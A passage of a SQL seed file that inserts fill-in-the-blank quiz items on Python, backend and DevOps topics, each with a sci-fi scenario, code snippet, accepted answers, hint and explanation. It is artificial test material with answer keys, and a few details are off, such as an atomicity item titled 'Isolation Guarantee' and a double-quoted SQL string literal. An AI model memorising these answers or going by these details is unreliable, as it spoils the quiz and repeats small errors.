  '00000004-0000-4000-8000-000000000003', 'What Python statement provides deterministic resource cleanup by automatically executing __enter__ and __exit__ methods on context managers?', 'Python & Backend Systems', ARRAY['python', 'context-managers', 'with', 'resources', 'file-handling', 'sector-1']::text[], 'Easy', 'The Resource Leak Sanctuary', 'Sector 1 exit logged fatal "Too many open files" OS exceptions because file descriptors were never closed during exception handling.', '____ open("containment.log", "r") as stream:
    telemetry = stream.read()
# File is guaranteed closed here even if exceptions arise', ARRAY['with', 'with ', 'with statement', 'the with statement']::text[], 'A 4-letter English word starting with "w".', 'The `with` statement guarantees cleanup of system resources (files, sockets, database locks) even when unexpected exceptions are raised.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000004', 'Which Python keyword turns a normal function into a generator that evaluates and yields items lazily one at a time?', 'Python & Backend Systems', ARRAY['python', 'generators', 'yield', 'iterators', 'memory', 'sector-2']::text[], 'Intermediate', 'The Memory-Efficient Stream', 'The server rack ran out of RAM (OOM kill) trying to load a 10GB telemetry file into a single in-memory Python list.', 'def stream_anomalies(log_file):
    for line in log_file:
        _____ line.strip() # WHAT KEYWORD PRODUCES VALUES LAZILY?', ARRAY['yield', 'yield ']::text[], 'Instead of "return", generators use this 5-letter word.', 'The `yield` keyword saves the local execution state of a generator, streaming items on demand with O(1) memory overhead.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000005', 'Which standard HTTP verb is designated by REST architecture for completely replacing a target resource idempotently?', 'Python & Backend Systems', ARRAY['python', 'rest-api', 'http-methods', 'idempotency', 'backend', 'sector-2']::text[], 'Intermediate', 'The Idempotent Replacement Method', 'A network retry caused an API client to duplicate inventory items because it used POST instead of an idempotent full replacement method.', '// Method where making 1 request or 10 identical requests leaves the server in the exact same state:
// WHAT HTTP VERB IS THIS?', ARRAY['put', 'PUT']::text[], 'Three letters, rhymes with "cut".', 'PUT is idempotent by HTTP specification: sending multiple identical PUT requests produces the exact same final resource state as one.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000006', 'What syntactic symbol precedes a Python decorator function when applying it to modify or wrap a function definition?', 'Python & Backend Systems', ARRAY['python', 'decorators', 'metaprogramming', 'functions', 'sector-2']::text[], 'Intermediate', 'The Metaprogramming Wrapper', 'Authentication and timing checks were duplicated across 30 FastAPI endpoints instead of wrapping them in reusable syntactic decorators.', '_require_auth
_measure_latency
def reboot_reactor():
    return {"status": "rebooting"}
# WHAT CHARACTER PREFIXES THE DECORATOR NAMES?', ARRAY['@', '@ ']::text[], 'The "at" sign used in email addresses.', 'The `@` symbol is syntactic sugar in Python for wrapping a function with another callable (e.g. `func = decorator(func)`).', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000007', 'In the ACID database guarantees, which property ensures that a transaction is treated as a single indivisible unit that either completely succeeds or completely fails?', 'Python & Backend Systems', ARRAY['python', 'acid', 'transactions', 'databases', 'sql', 'sector-3']::text[], 'Advanced', 'The ACID Isolation Guarantee', 'During a database crash midway through a financial credit transfer, money was debited but never credited because of a missing transaction wrapper.', '// ACID: [?], Consistency, Isolation, Durability
// WHAT PROPERTY GUARANTEES ALL-OR-NOTHING EXECUTION?', ARRAY['atomicity', 'atomic']::text[], 'Derived from "atom", meaning indivisible.', 'Atomicity ensures that if any operation within a transaction fails, the entire transaction is rolled back, leaving state clean.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000008', 'What is the acronym for the mutex mechanism in CPython that prevents multiple native threads from executing Python bytecodes simultaneously?', 'Python & Backend Systems', ARRAY['python', 'gil', 'concurrency', 'multithreading', 'cpython', 'sector-3']::text[], 'Advanced', 'The Global Interpreter Lock', 'Running four CPU-bound cryptographic cracking threads in Python only utilized 1 CPU core at 100% due to CPython''s internal mutex.', '// Multi-threaded CPU-bound programs in CPython are constrained by this 3-letter lock.
// WHAT IS ITS ACRONYM?', ARRAY['gil', 'the gil', 'global interpreter lock']::text[], 'Global Interpreter Lock.', 'The GIL (Global Interpreter Lock) synchronizes access to Python objects, restricting multi-threaded execution of Python bytecode to a single core.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000009', 'What popular open-source, in-memory data structure store is widely used as a distributed database cache and message broker?', 'Python & Backend Systems', ARRAY['python', 'redis', 'caching', 'performance', 'in-memory', 'sector-4']::text[], 'Advanced', 'The Distributed In-Memory Cache', 'Postgres query latency skyrocketed to 5 seconds under heavy load. A fast in-memory key-value store was deployed to cache hot session data.', 'import redis
client = redis.Redis(host="localhost", port=6379)
client.setex("session:user_101", 3600, "{...}") # WHAT CACHE SYSTEM IS THIS?', ARRAY['redis', 'redis-server']::text[], 'Remote Dictionary Server.', 'Redis stores key-value structures in RAM, providing sub-millisecond read/write operations ideal for caching and distributed locks.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000010', 'Which password hashing function uses an adjustable cost/work factor to deliberately slow down computation and resist hardware cracking?', 'Python & Backend Systems', ARRAY['python', 'bcrypt', 'passwords', 'security', 'key-derivation', 'sector-4']::text[], 'Advanced', 'The Adaptive Work Factor', 'The debug wing auth service used standard SHA-256 for password hashing. GPUs cracked 1 billion guesses per second.', 'import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# WHAT PASSWORD HASHING ALGORITHM IS THIS?', ARRAY['bcrypt', 'argon2', 'argon2id', 'pbkdf2']::text[], 'Starts with the letter "b", designed by Niels Provos and David Mazières.', 'bcrypt is a key derivation function with an adjustable cost factor that scales difficulty as computer hardware speeds increase.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000011', 'What HTTP status code must an API return when a client has exceeded its designated rate limit quota?', 'Python & Backend Systems', ARRAY['python', 'rate-limiting', 'http-status', 'apis', 'backend', 'sector-4']::text[], 'Advanced', 'The Throttling Bucket Drain', 'Rogue bots hammered the anomaly alert endpoint with 10,000 requests per minute, starving legitimate operator traffic.', '// HTTP/1.1 ___ Too Many Requests
// Retry-After: 60
// WHAT 3-DIGIT STATUS CODE GOES HERE?', ARRAY['429', '429 too many requests', 'http 429']::text[], 'Client error status code starting with 4, in the twenties.', 'HTTP status 429 Too Many Requests informs the client that it has exceeded rate limiting thresholds and indicates when it may retry.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000012', 'Which protocol, upgraded over standard HTTP via status 101, provides persistent, low-latency, two-way communication channels over a single TCP socket?', 'Python & Backend Systems', ARRAY['python', 'websockets', 'real-time', 'networking', 'tcp', 'sector-5']::text[], 'Advanced', 'The Bidirectional Socket Stream', 'HTTP polling added 800ms latency to real-time quantum telemetry. The system was upgraded to persistent full-duplex TCP connections.', '// Request: Upgrade: websocket / Connection: Upgrade
// Response: HTTP/1.1 101 Switching Protocols
// WHAT PROTOCOL IS THIS?', ARRAY['websocket', 'websockets', 'ws']::text[], 'WebSockets.', 'WebSockets enable bidirectional, full-duplex communication with minimal frame overhead after an initial HTTP handshake.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000013', 'What SQL command is used to inspect how the database query planner executes a query, revealing whether it uses an index scan or table scan?', 'Python & Backend Systems', ARRAY['python', 'sql', 'postgres', 'indexes', 'optimization', 'sector-5']::text[], 'Advanced', 'The B-Tree Index Traversal', 'Querying 50 million records took 14 seconds because Postgres performed a sequential full table scan on an un-indexed column.', '_______ ANALYZE SELECT * FROM telemetry WHERE sensor_uuid = "a1-94";
// WHAT KEYWORD INSTRUCTS THE PLANNER TO OUTPUT ITS EXECUTION PLAN?', ARRAY['explain', 'explain analyze', 'explain ']::text[], 'Ask the database to "explain" its query execution plan.', '`EXPLAIN ANALYZE` returns the execution plan of a query along with actual execution timings and cost estimates.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000004-0000-4000-8000-000000000014', 'In message queue and event streaming architectures, what specialized queue receives and isolates unprocessable or failed messages for manual inspection?', 'Python & Backend Systems', ARRAY['python', 'message-queues', 'kafka', 'dlq', 'microservices', 'sector-5']::text[], 'Expert', 'The Poison Message Quarantine', 'A malformed payload in the Kafka telemetry stream continuously crashed consumer workers upon processing, blocking the entire queue partition.', '// Failed after 5 retries -> Forward message to: ________ Queue (DLQ)
// WHAT IS THE FULL NAME OF THIS QUARANTINE QUEUE?', ARRAY['dead letter queue', 'dead-letter queue', 'dead letter', 'dlq']::text[], 'A "dead letter" office where undeliverable mail is kept.', 'A Dead Letter Queue (DLQ) isolates poison-pill messages so they do not block standard pipeline processing or cause infinite retry loops.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000001', 'What initial instruction in a Dockerfile specifies the base parent container image from which the new container build starts?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'docker', 'dockerfile', 'containers', 'sector-1']::text[], 'Easy', 'The Foundational Image Blueprint', 'The laboratory deployment script failed to build a container because the base operating system image was never declared.', '____ node:20-alpine # WHAT INSTRUCTION SPECIFIES THE BASE IMAGE?
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]', ARRAY['from', 'FROM', 'from ']::text[], 'Where the container image originates "from".', 'The `FROM` directive initializes a new build stage and sets the base image for subsequent Dockerfile instructions.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000002', 'Which Docker CLI flag maps a host machine port to a container port during "docker run" (e.g. -p host_port:container_port)?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'docker', 'networking', 'ports', 'containers', 'sector-1']::text[], 'Easy', 'The Container Ingress Bridge', 'A Node.js server inside a Docker container listens on port 3000, but host machine browsers cannot connect to it.', 'docker run -d _ 8080:3000 abyss-sentinel # WHAT SINGLE-LETTER FLAG MAPS PORTS?', ARRAY['-p', '--publish', '-p ', '-P']::text[], 'Short for publish or port.', 'The `-p host:container` flag publishes a container''s internal port to the host system''s network interface.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000003', 'What Dockerfile pattern uses multiple FROM statements to compile code in a temporary builder stage and copy only binaries to a slim runtime image?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'docker', 'multi-stage', 'optimization', 'security', 'sector-1']::text[], 'Intermediate', 'The Bloated Compiler Purge', 'The production container image size is 2.4 GB because the Go compiler and build dependencies were left inside the final shipping layer.', 'FROM golang:1.22 AS builder
RUN go build -o /app .

# WHAT PATTERN TRANSFERS ARTIFACTS TO A FRESH STAGE?
FROM alpine:3.19
COPY --from=builder /app /app', ARRAY['multi-stage build', 'multi stage build', 'multistage build', 'multi-stage builds', 'multi-stage']::text[], 'Building an image in "multiple stages".', 'Multi-stage Docker builds separate build-time toolchains from the final runtime environment, drastically reducing image size and attack surface.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000004', 'What is the smallest deployable atomic computing unit in Kubernetes, representing a single instance of a running process in a cluster?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'kubernetes', 'k8s', 'pods', 'orchestration', 'sector-2']::text[], 'Intermediate', 'The Atomic Compute Unit', 'The Kubernetes scheduler failed to deploy a raw container directly because Kubernetes orchestrates containers wrapped in a higher-level atomic abstraction.', 'apiVersion: v1
kind: ___
metadata:
  name: anomaly-sensor
spec:
  containers:
  - name: probe
    image: abyss/probe:v1', ARRAY['pod', 'Pod', 'a pod', 'pods']::text[], 'A pod of peas or a pod of whales.', 'A Pod is the fundamental execution unit in Kubernetes, encapsulating one or more tightly coupled containers sharing network and storage.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000005', 'Which Kubernetes resource abstraction provides a stable virtual IP and DNS name to load-balance traffic across a dynamic set of Pods?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'kubernetes', 'services', 'networking', 'k8s', 'sector-2']::text[], 'Intermediate', 'The Resilient Virtual IP Bridge', 'Pods are ephemeral and get replaced with new IP addresses on every restart, breaking client connections.', 'apiVersion: v1
kind: _______
metadata:
  name: core-service
spec:
  type: ClusterIP
  selector:
    app: core-api', ARRAY['service', 'Service', 'k8s service', 'services']::text[], 'ClusterIP, NodePort, and LoadBalancer are variants of this resource.', 'A Kubernetes Service defines a logical set of Pods and a policy to route network traffic to them via stable cluster IPs and DNS records.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000006', 'What popular open-source Infrastructure as Code (IaC) tool by HashiCorp uses declarative HCL files to provision and manage cloud infrastructure?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'terraform', 'iac', 'hcl', 'cloud-provisioning', 'sector-2']::text[], 'Intermediate', 'The Declarative State Anchor', 'Server configurations drifted across clusters due to manual changes made in cloud web dashboards, causing blast door locks to desynchronize.', 'resource "aws_s3_bucket" "containment_logs" {
  bucket = "abyss-containment-2026"
}
// WHAT INFRASTRUCTURE AS CODE TOOL PROCESSES THIS HCL SPEC?', ARRAY['terraform', 'opentofu', 'hashicorp terraform']::text[], 'Derived from "terra" (earth) and "form".', 'Terraform codifies cloud infrastructure into version-controlled declarative configuration files, ensuring reproducible deployments.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000007', 'Which Kubernetes health probe diagnostic periodically tests a container to determine whether the container needs to be killed and restarted?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'kubernetes', 'probes', 'liveness', 'reliability', 'sector-3']::text[], 'Advanced', 'The Deadlock Liveness Probe', 'A reactor monitoring container entered an internal thread deadlock. It was still running from Docker''s perspective, so Kubernetes never restarted it.', 'spec:
  containers:
  - name: core
    _____________:
      httpGet:
        path: /healthz
        port: 8080
      initialDelaySeconds: 5', ARRAY['livenessprobe', 'liveness probe', 'livenessProbe']::text[], 'Tests whether the application is still "live".', 'A livenessProbe detects application deadlocks or unrecoverable freezes, prompting the kubelet to restart the container automatically.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000008', 'What GitHub Actions standard action allows caching package manager dependencies across workflow runs to accelerate CI execution?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'ci-cd', 'github-actions', 'caching', 'automation', 'sector-3']::text[], 'Advanced', 'The Pipeline Dependency Cache', 'Every GitHub Actions workflow run took 12 minutes because 800MB of npm dependencies were re-downloaded from scratch on every commit.', '- name: Cache Node modules
  uses: actions/_____@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-node-${{ hashFiles("**/package-lock.json") }}', ARRAY['cache', 'actions/cache', 'cache@v4']::text[], 'A system for storing dependencies for quick retrieval.', 'The `actions/cache` GitHub Action caches directories matching a key, avoiding redundant dependency downloads in continuous integration pipelines.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000009', 'In serverless computing (e.g. AWS Lambda), what term describes the latency delay incurred when an idle function instance initializes a new execution environment?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'serverless', 'lambda', 'cloud', 'cold-start', 'sector-4']::text[], 'Advanced', 'The Cold Start Inversion', 'Debug wing emergency serverless lambdas suffered 3-second cold start delays because large container runtimes had to spin up on demand.', '// Request received -> New container booted -> Runtime downloaded -> Code loaded
// WHAT IS THIS INITIALIZATION LATENCY CALLED?', ARRAY['cold start', 'cold-start', 'a cold start']::text[], 'The opposite of a "warm" invocation.', 'A cold start occurs when an event triggers a serverless function that has no pre-warmed execution container ready, adding initialization latency.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000010', 'What query language is used by the Prometheus monitoring system to aggregate and query time-series dimensional metrics?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'prometheus', 'promql', 'monitoring', 'observability', 'sector-4']::text[], 'Advanced', 'The Time-Series PromQL Vector', 'Monitoring telemetry panels in Grafana need to calculate the per-second rate of HTTP 500 errors over the last 5 minutes.', 'rate(http_requests_total{status="500"}[5m])
// WHAT METRIC QUERY LANGUAGE IS THIS?', ARRAY['promql', 'promql query', 'prometheus query language']::text[], 'Prometheus Query Language.', 'PromQL (Prometheus Query Language) provides operators and functions (like `rate()`, `histogram_quantile()`) for querying dimensional time-series data.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000011', 'What popular declarative GitOps continuous delivery tool for Kubernetes continuously compares cluster live state with git repository manifests?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'gitops', 'argocd', 'cd', 'k8s', 'sector-4']::text[], 'Advanced', 'The Declarative GitOps Reconciler', 'Manual `kubectl apply` commands caused cluster state to diverge from git repository source code.', 'apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: abyss-core
spec:
  syncPolicy:
    automated: {}
// WHAT GITOPS CD TOOL USES THIS SPEC?', ARRAY['argocd', 'argo cd', 'argo-cd']::text[], 'A mythological ship named Argo.', 'ArgoCD is a declarative GitOps controller for Kubernetes that automatically detects configuration drift and synchronizes live cluster state with Git.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000005-0000-4000-8000-000000000012', 'What Dockerfile directive switches the active execution user to a non-privileged user to harden the container against privilege escalation?', 'DevOps & Cloud Infrastructure', ARRAY['devops', 'docker', 'security', 'rootless', 'hardening', 'sector-5']::text[], 'Advanced', 'The Rootless Container Shield', 'A container breakout exploit compromised the host kernel because the containerized Node.js process ran under UID 0 (root).', 'RUN adduser -D -u 1000 appuser
____ appuser # WHAT DIRECTIVE SWITCHES THE USER AWAY FROM ROOT?
CMD ["node", "server.js"]', ARRAY['user', 'USER', 'USER ']::text[], 'The word "USER" in a Dockerfile.', 'The `USER` directive drops root privileges in a Docker container, mitigating host kernel compromise in the event of a container escape.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
